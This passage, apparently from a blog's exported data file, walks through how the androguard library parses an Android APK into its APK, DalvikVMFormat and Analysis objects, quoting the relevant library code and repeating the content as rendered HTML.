AnalyzeAPK(apk_filepath)\n```\n\n---\n\n## Entry Point\n\nLet' us start from the ***AnalyzeAPK***.\n\n## AnalyzeAPK(androguard/misc.py)\n\nResponsible for the generation of the three objects below.\n\n* apk\n* dalvikvmformat\n* analysis\n\n---\n\n### [apk object](https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.apk.APK)\n\nYou can get information like the package name, permissions from the AndroidManifest.xml, which generated by class APK().\n\n**androguard/misc.py**\n\n```python=\na = APK(_file, raw=raw)\n```\n\n\n**androguard/core/bytecodes/apk.py**\n```python=\nclass APK():\n```\n\nIt will parse files in APK through Python zipfile module. This APK object is responsible for decompressing \"AndroidManifest.xml\" in APK.\n\nImplementation function:\n\n**androguard/core/bytecodes/apk.py**\n\n```python=\nif not skip_analysis:\n    self._apk_analysis()\n```\n\n```python=\ndef _apk_analysis(self)\n```\n\nASRC class\n\n    for decoding resources.arsc\n\nAXML class\n\n    for decoding AndroidManifest.xml and all other XML files\n    \nInside this method, it will get the information below.\n\n* AXML\n* Permissions\n* Each tag in xml\n\nThe following video records the process of making an apk object.\n\n{%youtube CpwzaB6U7BU %}\n\n\n---\n\n### [dalvikvmformat Object](https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.dvm.DalvikVMFormat)\n\nThe DalvikVMFormat corresponds to the DEX file found inside the APK file. You can get classes, methods or strings from the DEX file.\n\n\n**androguard/misc.py**\n\n```python=\nd = []\ndx = Analysis()\nfor dex in a.get_all_dex():\n    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())\n    dx.add(df)\n    d.append(df)\n    df.set_decompiler(decompiler.DecompilerDAD(d, dx))\n\ndx.create_xref()\n\nreturn a, d, dx\n```\n\n\n\n---\n\n### [Analysis Object](https://androguard.readthedocs.io/en/latest/api/androguard.core.analysis.html#androguard.core.analysis.analysis.Analysis)\n\nThe Analysis object should be used instead, as it contains special classes, which link information about the classes.dex and can even handle many DEX files at once.\n\nThe Analysis contains a lot of information about (multiple) DalvikVMFormat objects Features are for example XREFs between Classes, Methods, Fields, and Strings. Yet another part is the creation of BasicBlocks, which is important in the usage of the Androguard Decompiler.\n\n\n**quark/androguard/misc.py**\n\n```python=\ndx = Analysis()\n```\n\n**androguard/core/analysis/analysis.py**\n\n```python=\nclass Analysis:\n```\n\nFind information inside DEX file:\n\n* DalvikVMFormat objects\n* classname\n* string\n* methods\n\n[EXTERNAL method](https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html)\n\nIt is called the native API.\n\n[XREFs](https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html#xrefs)\n\nClasses, Methods, Fields, and Strings.\n\n---\n\nInitialize d and dx.\n\n![](https://i.imgur.com/uBkdkWj.png)\n\n\nPrepare for the following code below.\n\n```python=\nfor dex in a.get_all_dex():\n    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())\n    dx.add(df)\n    d.append(df)\n    df.set_decompiler(decompiler.DecompilerDAD(d, dx))\n\ndx.create_xref()\n```\n\nParam dex will return the raw data of all classes dex files.\n\n```python=\nget_all_dex()\n\n    dexre = re.compile(r\"classes(\\d*).dex\")\n    return filter(lambda x: dexre.match(x), self.get_files())\n```\n\n`get_all_dex` get all the file names in the zip, and get all the class.dex files through regular expressions, it may be classes.dex or classes[0-9]+.dex.\n\n\n**quark/androguard/misc.py**\n\n```python=\ndf = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())\n```\n\nDalvikVMFormat takes the binary content of each DEX as a parameter, and initializes the class DalvikVMFormat according to the API version used.\n\n\n**androguard/core/bytecodes/dvm.py**\n\n```python=\nclass DalvikVMFormat(bytecode.BuffHandle):\n    \"\"\"\n    This class can parse a classes.dex file of an Android application (APK).\n\n    :param buff: a string which represents the classes.dex file\n    :param decompiler: associate a decompiler object to display the java source code\n    :type buff: bytes\n    :type decompiler: object\n\n    example::\n\n        d = DalvikVMFormat( read(\"classes.dex\") )\n    \"\"\"\n\n    def __init__(self, buff, decompiler=None, config=None, using_api=None):\n        # to allow to pass apk object ==> we do not need to pass additionally target version\n        if isinstance(buff, APK):\n            self.api_version = buff.get_target_sdk_version()\n            buff = buff.get_dex()  # getting dex from APK file\n        elif using_api:\n            self.api_version = using_api\n        else:\n            self.api_version = CONF[\"DEFAULT_API\"]\n\n        super().__init__(buff)\n        self._flush()\n\n        self.CM = ClassManager(self)\n        self.CM.set_decompiler(decompiler)\n\n        self._preload(buff)\n        self._load(buff)\n```\n\nThis class can parse a classes.dex file of an Android application (APK).\n\n\n\n**androguard/core/bytecodes/dvm.py**\n\n* ClassManager\n\nThis class is used to access to all elements (strings, type, proto ...) of the dex format based on their offset or index.\n\n\n* set_decompiler\n\nSetting the disassembled tool used for disassembling an apk such as Jadx or DAD.\n\n\nLast one:\n\n**androguard/core/analysis/analysis.py**\n\n```python=\ndx.create_xref()\n```\n\nCreate Class, Method, String, and Field crossreferences for all classes in the Analysis.\n\nIf you are using multiple DEX files, this function must be called when all DEX files are added. If you call the function after every DEX file, it will only work for the first time.\n\nThis function is already called in the object Analysis, so we don't need to call it again.\n\n\nThe following video records the process of making an DalvikVMFormat object.\n\n{%youtube Q3oCMVyhGLw %}\n\n\n# Important\n\n\nOnly when calling the `get_source_method` function in [DecompilerDAD](https://androguard.readthedocs.io/en/latest/api/androguard.decompiler.html#androguard.decompiler.decompiler.DecompilerDAD) is it considered that disassemble an apk.\n\nIn fact, we only use the information in the Dex file and the method of cross-references, as well as the information about android permission. We did not do the disassemble an apk.\n\n\n\n\n\n\n","slug":"androguard-code-tracing","published":1,"updated":"2023-04-20T07:41:28.345Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepn4000ni7rih24765pb","content":"<h1 id=\"androguard-code-trace\"><a href=\"#androguard-code-trace\" class=\"headerlink\" title=\"androguard code trace\"></a>androguard code trace</h1><h2 id=\"androguard-Usage\"><a href=\"#androguard-Usage\" class=\"headerlink\" title=\"androguard Usage\"></a>androguard Usage</h2><p>This is the most common way how we use androguard.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> androguard.misc <span class=\"keyword\">import</span> AnalyzeAPK</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">apk, dalvikvmformat, analysis = AnalyzeAPK(apk_filepath)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"Entry-Point\"><a href=\"#Entry-Point\" class=\"headerlink\" title=\"Entry Point\"></a>Entry Point</h2><p>Let’ us start from the <em><strong>AnalyzeAPK</strong></em>.</p>\n<h2 id=\"AnalyzeAPK-androguard-x2F-misc-py\"><a href=\"#AnalyzeAPK-androguard-x2F-misc-py\" class=\"headerlink\" title=\"AnalyzeAPK(androguard&#x2F;misc.py)\"></a>AnalyzeAPK(androguard&#x2F;misc.py)</h2><p>Responsible for the generation of the three objects below.</p>\n<ul>\n<li>apk</li>\n<li>dalvikvmformat</li>\n<li>analysis</li>\n</ul>\n<hr>\n<h3 id=\"apk-object\"><a href=\"#apk-object\" class=\"headerlink\" title=\"apk object\"></a><a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.apk.APK\">apk object</a></h3><p>You can get information like the package name, permissions from the AndroidManifest.xml, which generated by class APK().</p>\n<p><strong>androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = APK(_file, raw=raw)</span><br></pre></td></tr></table></figure>\n\n\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;apk.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">APK</span>():</span><br></pre></td></tr></table></figure>\n\n<p>It will parse files in APK through Python zipfile module. This APK object is responsible for decompressing “AndroidManifest.xml” in APK.</p>\n<p>Implementation function:</p>\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;apk.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> skip_analysis:</span><br><span class=\"line\">    self._apk_analysis()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_apk_analysis</span>(<span class=\"params\">self</span>)</span><br></pre></td></tr></table></figure>\n\n<p>ASRC class</p>\n<pre><code>for decoding resources.arsc\n</code></pre>\n<p>AXML class</p>\n<pre><code>for decoding AndroidManifest.xml and all other XML files\n</code></pre>\n<p>Inside this method, it will get the information below.</p>\n<ul>\n<li>AXML</li>\n<li>Permissions</li>\n<li>Each tag in xml</li>\n</ul>\n<p>The following video records the process of making an apk object.</p>\n<div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/CpwzaB6U7BU\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div>\n\n\n<hr>\n<h3 id=\"dalvikvmformat-Object\"><a href=\"#dalvikvmformat-Object\" class=\"headerlink\" title=\"dalvikvmformat Object\"></a><a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.dvm.DalvikVMFormat\">dalvikvmformat Object</a></h3><p>The DalvikVMFormat corresponds to the DEX file found inside the APK file. You can get classes, methods or strings from the DEX file.</p>\n<p><strong>androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = []</span><br><span class=\"line\">dx = Analysis()</span><br><span class=\"line\"><span class=\"keyword\">for</span> dex <span class=\"keyword\">in</span> a.get_all_dex():</span><br><span class=\"line\">    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())</span><br><span class=\"line\">    dx.add(df)</span><br><span class=\"line\">    d.append(df)</span><br><span class=\"line\">    df.set_decompiler(decompiler.DecompilerDAD(d, dx))</span><br><span class=\"line\"></span><br><span class=\"line\">dx.create_xref()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> a, d, dx</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h3 id=\"Analysis-Object\"><a href=\"#Analysis-Object\" class=\"headerlink\" title=\"Analysis Object\"></a><a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.core.analysis.html#androguard.core.analysis.analysis.Analysis\">Analysis Object</a></h3><p>The Analysis object should be used instead, as it contains special classes, which link information about the classes.dex and can even handle many DEX files at once.</p>\n<p>The Analysis contains a lot of information about (multiple) DalvikVMFormat objects Features are for example XREFs between Classes, Methods, Fields, and Strings. Yet another part is the creation of BasicBlocks, which is important in the usage of the Androguard Decompiler.</p>\n<p><strong>quark&#x2F;androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dx = Analysis()</span><br></pre></td></tr></table></figure>\n\n<p><strong>androguard&#x2F;core&#x2F;analysis&#x2F;analysis.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Analysis</span>:</span><br></pre></td></tr></table></figure>\n\n<p>Find information inside DEX file:</p>\n<ul>\n<li>DalvikVMFormat objects</li>\n<li>classname</li>\n<li>string</li>\n<li>methods</li>\n</ul>\n<p><a href=\"https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html\">EXTERNAL method</a></p>\n<p>It is called the native API.</p>\n<p><a href=\"https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html#xrefs\">XREFs</a></p>\n<p>Classes, Methods, Fields, and Strings.</p>\n<hr>\n<p>Initialize d and dx.</p>\n<p><img src=\"https://i.imgur.com/uBkdkWj.png\"></p>\n<p>Prepare for the following code below.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> dex <span class=\"keyword\">in</span> a.get_all_dex():</span><br><span class=\"line\">    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())</span><br><span class=\"line\">    dx.add(df)</span><br><span class=\"line\">    d.append(df)</span><br><span class=\"line\">    df.set_decompiler(decompiler.DecompilerDAD(d, dx))</span><br><span class=\"line\"></span><br><span class=\"line\">dx.create_xref()</span><br></pre></td></tr></table></figure>\n\n<p>Param dex will return the raw data of all classes dex files.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get_all_dex()</span><br><span class=\"line\"></span><br><span class=\"line\">    dexre = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;classes(\\d*).dex&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> x: dexre.match(x), self.get_files())</span><br></pre></td></tr></table></figure>\n\n<p><code>get_all_dex</code> get all the file names in the zip, and get all the class.dex files through regular expressions, it may be classes.dex or classes[0-9]+.dex.</p>\n<p><strong>quark&#x2F;androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())</span><br></pre></td></tr></table></figure>\n\n<p>DalvikVMFormat takes the binary content of each DEX as a parameter, and initializes the class DalvikVMFormat according to the API version used.</p>\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;dvm.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DalvikVMFormat</span>(bytecode.BuffHandle):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    This class can parse a classes.dex file of an Android application (APK).</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    :param buff: a string which represents the classes.dex file</span></span><br><span class=\"line\"><span class=\"string\">    :param decompiler: associate a decompiler object to display the java source code</span></span><br><span class=\"line\"><span class=\"string\">    :type buff: bytes</span></span><br><span class=\"line\"><span class=\"string\">    :type decompiler: object</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    example::</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        d = DalvikVMFormat( read(&quot;classes.dex&quot;) )</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, buff, decompiler=<span class=\"literal\">None</span>, config=<span class=\"literal\">None</span>, using_api=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        <span class=\"comment\"># to allow to pass apk object ==&gt; we do not need to pass additionally target version</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(buff, APK):</span><br><span class=\"line\">            self.api_version = buff.get_target_sdk_version()</span><br><span class=\"line\">            buff = buff.get_dex()  <span class=\"comment\"># getting dex from APK file</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> using_api:</span><br><span class=\"line\">            self.api_version = using_api</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.api_version = CONF[<span class=\"string\">&quot;DEFAULT_API&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__(buff)</span><br><span class=\"line\">        self._flush()</span><br><span class=\"line\"></span><br><span class=\"line\">        self.CM = ClassManager(self)</span><br><span class=\"line\">        self.CM.set_decompiler(decompiler)</span><br><span class=\"line\"></span><br><span class=\"line\">        self._preload(buff)</span><br><span class=\"line\">        self._load(buff)</span><br></pre></td></tr></table></figure>\n\n<p>This class can parse a classes.dex file of an Android application (APK).</p>\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;dvm.py</strong></p>\n<ul>\n<li>ClassManager</li>\n</ul>\n<p>This class is used to access to all elements (strings, type, proto …) of the dex format based on their offset or index.</p>\n<ul>\n<li>set_decompiler</li>\n</ul>\n<p>Setting the disassembled tool used for disassembling an apk such as Jadx or DAD.</p>\n<p>Last one:</p>\n<p><strong>androguard&#x2F;core&#x2F;analysis&#x2F;analysis.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dx.create_xref()</span><br></pre></td></tr></table></figure>\n\n<p>Create Class, Method, String, and Field crossreferences for all classes in the Analysis.</p>\n<p>If you are using multiple DEX files, this function must be called when all DEX files are added. If you call the function after every DEX file, it will only work for the first time.</p>\n<p>This function is already called in the object Analysis, so we don’t need to call it again.</p>\n<p>The following video records the process of making an DalvikVMFormat object.</p>\n<div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/Q3oCMVyhGLw\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div>\n\n\n<h1 id=\"Important\"><a href=\"#Important\" class=\"headerlink\" title=\"Important\"></a>Important</h1><p>Only when calling the <code>get_source_method</code> function in <a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.decompiler.html#androguard.decompiler.decompiler.DecompilerDAD\">DecompilerDAD</a> is it considered that disassemble an apk.</p>\n<p>In fact, we only use the information in the Dex file and the method of cross-references, as well as the information about android permission. We did not do the disassemble an apk.</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"androguard-code-trace\"><a href=\"#androguard-code-trace\" class=\"headerlink\" title=\"androguard code trace\"></a>androguard code trace</h1><h2 id=\"androguard-Usage\"><a href=\"#androguard-Usage\" class=\"headerlink\" title=\"androguard Usage\"></a>androguard Usage</h2><p>This is the most common way how we use androguard.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> androguard.misc <span class=\"keyword\">import</span> AnalyzeAPK</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">apk, dalvikvmformat, analysis = AnalyzeAPK(apk_filepath)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"Entry-Point\"><a href=\"#Entry-Point\" class=\"headerlink\" title=\"Entry Point\"></a>Entry Point</h2><p>Let’ us start from the <em><strong>AnalyzeAPK</strong></em>.</p>\n<h2 id=\"AnalyzeAPK-androguard-x2F-misc-py\"><a href=\"#AnalyzeAPK-androguard-x2F-misc-py\" class=\"headerlink\" title=\"AnalyzeAPK(androguard&#x2F;misc.py)\"></a>AnalyzeAPK(androguard&#x2F;misc.py)</h2><p>Responsible for the generation of the three objects below.</p>\n<ul>\n<li>apk</li>\n<li>dalvikvmformat</li>\n<li>analysis</li>\n</ul>\n<hr>\n<h3 id=\"apk-object\"><a href=\"#apk-object\" class=\"headerlink\" title=\"apk object\"></a><a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.apk.APK\">apk object</a></h3><p>You can get information like the package name, permissions from the AndroidManifest.xml, which generated by class APK().</p>\n<p><strong>androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = APK(_file, raw=raw)</span><br></pre></td></tr></table></figure>\n\n\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;apk.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">APK</span>():</span><br></pre></td></tr></table></figure>\n\n<p>It will parse files in APK through Python zipfile module. This APK object is responsible for decompressing “AndroidManifest.xml” in APK.</p>\n<p>Implementation function:</p>\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;apk.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> skip_analysis:</span><br><span class=\"line\">    self._apk_analysis()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_apk_analysis</span>(<span class=\"params\">self</span>)</span><br></pre></td></tr></table></figure>\n\n<p>ASRC class</p>\n<pre><code>for decoding resources.arsc\n</code></pre>\n<p>AXML class</p>\n<pre><code>for decoding AndroidManifest.xml and all other XML files\n</code></pre>\n<p>Inside this method, it will get the information below.</p>\n<ul>\n<li>AXML</li>\n<li>Permissions</li>\n<li>Each tag in xml</li>\n</ul>\n<p>The following video records the process of making an apk object.</p>\n<div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/CpwzaB6U7BU\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div>\n\n\n<hr>\n<h3 id=\"dalvikvmformat-Object\"><a href=\"#dalvikvmformat-Object\" class=\"headerlink\" title=\"dalvikvmformat Object\"></a><a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.dvm.DalvikVMFormat\">dalvikvmformat Object</a></h3><p>The DalvikVMFormat corresponds to the DEX file found inside the APK file. You can get classes, methods or strings from the DEX file.</p>\n<p><strong>androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = []</span><br><span class=\"line\">dx = Analysis()</span><br><span class=\"line\"><span class=\"keyword\">for</span> dex <span class=\"keyword\">in</span> a.get_all_dex():</span><br><span class=\"line\">    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())</span><br><span class=\"line\">    dx.add(df)</span><br><span class=\"line\">    d.append(df)</span><br><span class=\"line\">    df.set_decompiler(decompiler.DecompilerDAD(d, dx))</span><br><span class=\"line\"></span><br><span class=\"line\">dx.create_xref()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> a, d, dx</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h3 id=\"Analysis-Object\"><a href=\"#Analysis-Object\" class=\"headerlink\" title=\"Analysis Object\"></a><a href=\"https://androguard.readthedocs.io/en/latest/api/androguard.core.analysis.html#androguard.core.analysis.analysis.Analysis\">Analysis Object</a></h3><p>The Analysis object should be used instead, as it contains special classes, which link information about the classes.dex and can even handle many DEX files at once.</p>\n<p>The Analysis contains a lot of information about (multiple) DalvikVMFormat objects Features are for example XREFs between Classes, Methods, Fields, and Strings. Yet another part is the creation of BasicBlocks, which is important in the usage of the Androguard Decompiler.</p>\n<p><strong>quark&#x2F;androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dx = Analysis()</span><br></pre></td></tr></table></figure>\n\n<p><strong>androguard&#x2F;core&#x2F;analysis&#x2F;analysis.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Analysis</span>:</span><br></pre></td></tr></table></figure>\n\n<p>Find information inside DEX file:</p>\n<ul>\n<li>DalvikVMFormat objects</li>\n<li>classname</li>\n<li>string</li>\n<li>methods</li>\n</ul>\n<p><a href=\"https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html\">EXTERNAL method</a></p>\n<p>It is called the native API.</p>\n<p><a href=\"https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html#xrefs\">XREFs</a></p>\n<p>Classes, Methods, Fields, and Strings.</p>\n<hr>\n<p>Initialize d and dx.</p>\n<p><img src=\"https://i.imgur.com/uBkdkWj.png\"></p>\n<p>Prepare for the following code below.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> dex <span class=\"keyword\">in</span> a.get_all_dex():</span><br><span class=\"line\">    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())</span><br><span class=\"line\">    dx.add(df)</span><br><span class=\"line\">    d.append(df)</span><br><span class=\"line\">    df.set_decompiler(decompiler.DecompilerDAD(d, dx))</span><br><span class=\"line\"></span><br><span class=\"line\">dx.create_xref()</span><br></pre></td></tr></table></figure>\n\n<p>Param dex will return the raw data of all classes dex files.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get_all_dex()</span><br><span class=\"line\"></span><br><span class=\"line\">    dexre = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;classes(\\d*).dex&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> x: dexre.match(x), self.get_files())</span><br></pre></td></tr></table></figure>\n\n<p><code>get_all_dex</code> get all the file names in the zip, and get all the class.dex files through regular expressions, it may be classes.dex or classes[0-9]+.dex.</p>\n<p><strong>quark&#x2F;androguard&#x2F;misc.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())</span><br></pre></td></tr></table></figure>\n\n<p>DalvikVMFormat takes the binary content of each DEX as a parameter, and initializes the class DalvikVMFormat according to the API version used.</p>\n<p><strong>androguard&#x2F;core&#x2F;bytecodes&#x2F;dvm.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span 